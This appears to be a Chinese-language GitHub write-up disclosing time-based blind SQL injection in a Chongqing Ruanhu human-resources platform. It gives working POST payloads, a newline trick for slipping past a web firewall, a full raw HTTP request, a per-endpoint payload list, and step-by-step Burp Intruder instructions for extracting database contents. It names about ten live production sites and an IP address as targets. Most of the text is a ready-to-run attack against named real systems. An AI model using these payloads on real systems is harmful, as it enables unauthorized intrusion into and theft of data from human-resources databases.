重庆软狐信息技术有限公司智慧人力资源市场服务统一平台存在SQL注入漏洞
在如下三个子目录接口存在SQL注入(通过特殊手段绕过WAF实现时间延时盲注) 目前所有版本都可复现
"/Admin/Home/CT_SysAdminUpdatePwd_new",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetReMenNewsList"


![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/42cf137f-dbd0-414a-ac6c-7e77b241f152)
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/c473eef8-b5cb-41d2-a1af-cd7af2053f05)


案例1:
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/cb01be87-5ea3-431c-ba2e-54165bb126c6)

https://tn.ruanho.com/Website/home/CT_GetNewsInfo
POST_payload:
leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=6&text=
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/0f99fbb9-dee4-495b-917d-a6e773dfeb63)



案例2
https://hw.naqjyhrcfwj.cn/Website/home/CT_GetNewsInfo
POST_payload:
leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=6&text=




案例3:
https://bsg.ruanho.com/Website/home/CT_GetNewsInfo
POST_payload:
leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=6&text=
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/c8be1da4-f891-405f-a4bd-dcc33b3ba50b)
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/1f02d4a3-e7a8-47c6-b610-f4aa8827181a)


案例4:
https://www.pxrc.com.cn/Website/home/CT_GetNewsInfo
POST_payload:
leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=6&text=
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/de3cb6df-c05a-4d23-b48e-0e5183c78143)

![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/0037c26f-adc4-49a4-a20f-9f49d57049e5)


案例5:
https://cqtl.ruanho.com/Website/home/CT_GetNewsInfo
POST_payload:
leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=6&text=
步骤同上
案例6:
http://tnwx.ruanho.com/Website/home/CT_GetNewsInfo
案例7:
http://183.230.235.30:91/Website/home/CT_GetNewsInfo
案例8:
https://tn.ruanho.com/Website/home/CT_GetNewsInfo
案例9:
https://ls.xzrcfw.com/Website/home/CT_GetNewsInfo
案例10:
http://cqdzjy.ruanho.com:90/Website/home/CT_GetNewsInfo

复现步骤:
1.找存在sql注入的子目录接口
访问url+如下4个子目录如果返回500系统错误即该接口大概率存在sql注入
"/Admin/Home/CT_SysAdminUpdatePwd_new",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetReMenNewsList"

![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/d90bb313-5195-477c-acad-a3507a844053)

访问url+/Website/home/CT_GetReMenNewsList接口拼接url
https://hw.naqjyhrcfwj.cn:8022/Website/Home/CT_GetReMenNewsList
2.使用burp抓包,放入repeater中
3.将HTTP方式修改为POST
4.并在headers中添加头Content-Type: application/x-www-form-urlencoded
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/3018816f-bdc6-49d6-8261-40008860174a)

5.构造Post的payload
该接口post传输参数为:
leaveId={GetReMenNewsList_leaveId}&pageIndex=1&pageSize=5&queryType=0
leaveId为注入点
当构造select from的语句时会被waf拦截
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/001bfe91-7366-4f01-b411-a594969e269c)

绕过手段为在select  from之间添加%0a  才可进行绕过即(并且添加Content-Type: application/x-www-form-urlencoded头)
Select%20xxxx%0afrom%20xxxxx
查询表名语句为:
if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)
![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/c075ca85-9365-44e7-9abc-0a4be49986f6)

6.后续通过intruder模块进行爆破出数据库的每一位字符串

![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/9042a60e-2b03-4446-8c21-8a199900665d)

部分数据库信息如下

![image](https://github.com/Hpterosaur/RPCSQLexp/assets/62538739/28fc64eb-4fa2-47a6-990f-2ddfe21524a0)



备注POST包
SQLmap无法跑出此注入
POST包
POST /Website/Home/CT_GetReMenNewsList HTTP/1.1
Host: hw.naqjyhrcfwj.cn:8022
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: ASP.NET_SessionId=mwqo1drvjsw053hsxz53hzz5
Connection: close
Content-Length: 187
Content-Type: application/x-www-form-urlencoded

leaveId=if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)&pageIndex=1&pageSize=5&queryType=0


各子目录对应payload如下:依次按顺序对应
 target_subdirectories = [
        "/Admin/Home/CT_SysAdminUpdatePwd_new",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetReMenNewsList"
    ]

payloads = [
        "LginPwdstr=%5C147%5C60%5C60%5C144%5C120%5C141%5C44%5C44%5C167%5C60%5C162%5C104&code={code}&oldpwd=%5C147%5C60%5C60%5C144%5C120%5C141%5C44%5C44%5C167%5C60%5C162%5C104",
        "leaveId={GetNewsInfo_leaveId}&pageIndex=1&pageSize=6&text=",
        "leaveId=52&pageIndex=1&pageSize=6&text={text}",
        "leaveId={GetReMenNewsList_leaveId}&pageIndex=1&pageSize=5&queryType=0"
    ]

sql_payloads = {"code": "0'XOR(if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0))XOR'Z",
                    "GetNewsInfo_leaveId":"if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)",
                    "text":"0'XOR(if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0))XOR'Z",
                    "GetReMenNewsList_leaveId":"if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)"
                    }


